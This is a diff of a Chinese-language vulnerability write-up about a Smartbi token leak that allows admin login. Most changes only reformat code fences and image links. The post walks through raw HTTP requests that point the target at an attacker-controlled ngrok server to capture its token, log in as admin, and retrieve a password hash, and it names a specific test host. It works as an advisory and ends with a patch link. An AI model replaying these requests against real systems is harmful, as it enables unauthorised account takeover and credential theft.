@@ -8,7 +8,7 @@ updated: 2023-08-01T00:00:00+00:00
 date: 2023-08-01T00:00:00+00:00
 slug: smartbi-monitorservice-token-disclosure
 title: Smartbi token泄漏致使任意登录漏洞分析
-cover: https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/f158a7fe-22da-4d36-a9cf-c2a15c83d769/logged-in.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050157Z&X-Amz-Expires=3600&X-Amz-Signature=fd5c5a531dc78335c2c1c0b72ea371709a81888c8851b07efb4289279fcad6ed&X-Amz-SignedHeaders=host&x-id=GetObject
+cover: /img/post/smartbi-monitorservice-token-disclosure/logged-in.png
 id: 111906e1-7468-8019-826d-fe56201d5edf
 ---
 
@@ -498,7 +498,7 @@ func printHTTPRequest(r *http.Request) {
 
 向目标站点发送`"SERVICE_ADDRESS"`，注意`Content-Type`标头。
 
-```text
+```http
 POST /smartbi/smartbix/api/monitor/setServiceAddress HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0
@@ -507,10 +507,10 @@ Content-Length: 40
 Content-Type: text/plain
 Accept-Encoding: gzip, deflate
 
-<https://hz29-03-542-6-825.ngrok-free.app>
+https://hz29-03-542-6-825.ngrok-free.app
 ```
 
-```text
+```http
 HTTP/1.1 200
 Server: nginx
 Date: Wed, 02 Aug 2023 02:48:27 GMT
@@ -525,7 +525,7 @@ Set-Cookie: JSESSIONID=9DAB60CE0FFEDC6475B6F1837BA6C3D5; Path=/smartbi; HttpOnly
 
 请求`/engineInfo`，可以查看刚刚设置的`serviceAddress`。
 
-```text
+```http
 POST /smartbi/smartbix/api/monitor/engineInfo HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0
@@ -537,7 +537,7 @@ Accept-Encoding: gzip, deflate
 
 ```
 
-```text
+```http
 HTTP/1.1 200
 Server: nginx
 Date: Wed, 02 Aug 2023 02:58:37 GMT
@@ -547,12 +547,12 @@ Connection: close
 Set-Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be88dda52d11; Path=/smartbi; HttpOnly
 Set-Cookie: JSESSIONID=CD64F807282B28163038F08D5783DFE9; Path=/smartbi; HttpOnly
 
-{"took":0,"success":true,"message":"Operation successful","code":200,"entity":{"serviceAddress":"<https://hz29-03-542-6-825.ngrok-free.app>","engineAddress":"className=UserService\\u0026methodName=isLogged\\u0026params=%5B%5D"}}
+{"took":0,"success":true,"message":"Operation successful","code":200,"entity":{"serviceAddress":"https://hz29-03-542-6-825.ngrok-free.app","engineAddress":"className=UserService\u0026methodName=isLogged\u0026params=%5B%5D"}}
 ```
 
 接着，触发目标站点向我们可控的服务器发送 token。
 
-```text
+```http
 POST /smartbi/smartbix/api/monitor/token HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0
@@ -564,7 +564,7 @@ Accept-Encoding: gzip, deflate
 service
 ```
 
-```text
+```http
 HTTP/1.1 200
 Server: nginx
 Date: Wed, 02 Aug 2023 02:48:31 GMT
@@ -579,7 +579,7 @@ Set-Cookie: JSESSIONID=68897394A366E12C9C72BC8C12D57670; Path=/smartbi; HttpOnly
 与此同时，观察服务器上接收到的 HTTP 报文。
 
 ```shell
-$ go run main.go                                                                                          ∞ ∞
+$ go run main.go
 Server is running on *:8088
 --- Received HTTP Request ---
 POST /api/v1/configs/engine/smartbitoken HTTP/1.1
@@ -596,7 +596,7 @@ X-Forwarded-Proto: [https]
 
 然后，就可以拿这个 token 去请求`/login` ，从而获得一个有效的 JSESSIONID。
 
-```text
+```http
 POST /smartbi/smartbix/api/monitor/login HTTP/1.1
 Host:
 User-Agent: Mozilla/5.0
@@ -608,7 +608,7 @@ Accept-Encoding: gzip, deflate
 admin_I8a8a86440188d7d8d7d84ba80189be79a6532cff
 ```
 
-```text
+```http
 HTTP/1.1 200
 Server: nginx
 Date: Wed, 02 Aug 2023 03:06:56 GMT
@@ -623,15 +623,15 @@ Set-Cookie: JSESSIONID=31A219361B718184DBB129256068F050; Path=/smartbi; HttpOnly
 
 替换如下 Cookie 标头便能成功实现管理员用户登录。
 
-```text
+```http
 Cookie: smartbi_smartbi_sessionid=I8a8a86440188d7d8d7d84ba80189be86d8f62d0d; JSESSIONID=82214AE5A1234133379C4ED20E0A5CF8
 ```
 
-![](https://prod-files-secure.s3.us-west-2.amazonaws.com/67fdb170-fbbe-4acc-adb2-bfe5483404bd/2c01a18f-e8cf-4dca-bf3d-e7acba91b55d/logged-in.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20241006%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20241006T050158Z&X-Amz-Expires=3600&X-Amz-Signature=519d40dc40ea9ceb8f6256be96ea5cb64170eedf6ba249affbed0c8f01e5fc39&X-Amz-SignedHeaders=host&x-id=GetObject)
+![](/img/post/smartbi-monitorservice-token-disclosure/logged-in.png)
 
 当然，还可以利用如上 Cookie 直接获取用户的密码，不过不是明文。
 
-```text
+```http
 POST /smartbi/vision/RMIServlet HTTP/1.1
 Host: smartbi-test.miaozhen.com
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36
@@ -644,7 +644,7 @@ Accept-Encoding: gzip, deflate
 className=UserService&methodName=getPassword&params=["admin"]
 ```
 
-```text
+```http
 HTTP/1.1 200
 Server: nginx
 Date: Wed, 02 Aug 2023 03:06:56 GMT
@@ -661,4 +661,4 @@ Connection: close
 
 目前厂商已发布安全补丁以修复这个安全问题，请通过如下链接下载安全补丁：
 
-- [https://www.smartbi.com.cn/patchinfo](https://www.smartbi.com.cn/patchinfo)
+- https://www.smartbi.com.cn/patchinfo
